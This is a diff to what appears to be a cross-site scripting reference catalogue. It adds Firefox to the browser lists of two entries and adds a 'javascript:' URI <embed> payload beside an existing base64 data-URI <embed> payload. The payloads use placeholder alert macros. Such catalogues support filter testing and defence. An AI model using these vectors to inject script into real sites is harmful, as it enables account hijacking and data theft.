@@ -566,7 +566,8 @@ return [
             'zh' : '不要允许用户提交的HTML中含有"pattern"属性,确保验证的正则写的没啥问题.'
         },            
         'browsers'   : {
-            'opera': ['10.0']
+            'opera': ['10.0'],
+            'firefox': ['12.0', 'latest']
         },
         'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera', 'proprietary'],
         'reporter'   : '.mario'
@@ -1861,7 +1862,7 @@ return [
             'cs' : 'Spuštění JavaScriptu použitím atributu SRC tagu <EMBED>',
             'de' : ''
         },
-        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%"></embed>',
+        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%"></embed>\r\n\r\n<embed src="javascript:%js_alert%"></embed> // Firefox only',
         'description': {
             'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
             'ja' : '',
@@ -1880,7 +1881,8 @@ return [
         'browsers'   : {
             'opera': ['8.x', 'latest'], 
             'chrome': ['3.0', 'latest'],
-            'safari': ['4.0', 'latest']
+            'safari': ['4.0', 'latest'],
+            'firefox': ['12.0', 'latest'],
         },
         'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'base64'],
         'reporter'   : '.mario'
